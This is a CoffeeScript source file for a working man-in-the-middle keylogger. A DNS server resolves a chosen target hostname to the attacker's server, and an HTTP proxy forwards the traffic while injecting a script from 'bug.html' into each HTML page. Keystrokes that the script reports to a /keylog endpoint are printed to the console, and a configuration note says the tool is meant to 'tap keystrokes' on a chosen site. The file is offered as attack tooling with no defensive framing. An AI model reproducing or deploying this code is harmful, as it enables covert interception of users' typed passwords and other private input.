
httpProxy = require 'http-proxy'
fs = require 'fs'
dns = require 'native-dns'

bug = fs.readFileSync 'bug.html'

HTTP_PORT = 80
DNS_PORT = 53
DNS_TIMEOUT = 1000
DNS_TTL = 60

ENV_VARS =
  PUBLIC_IP:    'The public IP of this server'
  TAP_HOST:     'The hostname of the site for which you want to tap keystrokes'
  UPSTREAM_DNS: 'A DNS server to use for non-tapped hostnames'

for param, desc of ENV_VARS
  if not process.env[param]
    console.log "The environment variable #{param} (#{desc}) must be set."
    process.exit()

server = httpProxy.createServer (req, res, proxy) ->
  if /^\/keylog/.exec(req.url)
    key = /key=(.)/.exec(req.url)?[1]
    process.stdout.write key
    res.writeHead(200)
    res.end('ok')

  res.oldWriteHead = res.writeHead
  res.writeHead = (code, headers) ->
    if /text\/html/.exec(headers['content-type'])
      delete headers['content-length']

      data = ''
      res.oldWrite = res.write
      res.write = (chunk) ->
        data += chunk

      res.oldEnd = res.end
      res.end = ->
        data = data.replace('</title>', "</title>#{bug}")
        res.oldWrite(data)
        res.oldEnd()

    res.oldWriteHead code, headers

  proxy.proxyRequest req, res,
    host: req.headers['host']
    port: HTTP_PORT

server.listen HTTP_PORT

handleRequest = (req, res) ->
  if req.question[0].name == process.env.TAP_HOST
    res.answer.push dns.A
      name: req.question[0].name
      address: process.env.PUBLIC_IP
      ttl: DNS_TTL
    res.send()
  else
    newReq = dns.Request
      server:
        address: process.env.UPSTREAM_DNS
        port: DNS_PORT
      question: dns.Question(req.question[0])
      timeout: DNS_TIMEOUT
    newReq.on 'message', (err, answer) ->
      res.answer = res.answer.concat(answer.answer)
    newReq.on 'end', ->
      res.send()
    newReq.send()

dnsServer = dns.createServer()
dnsServer.on 'request', handleRequest
dnsServer.serve DNS_PORT

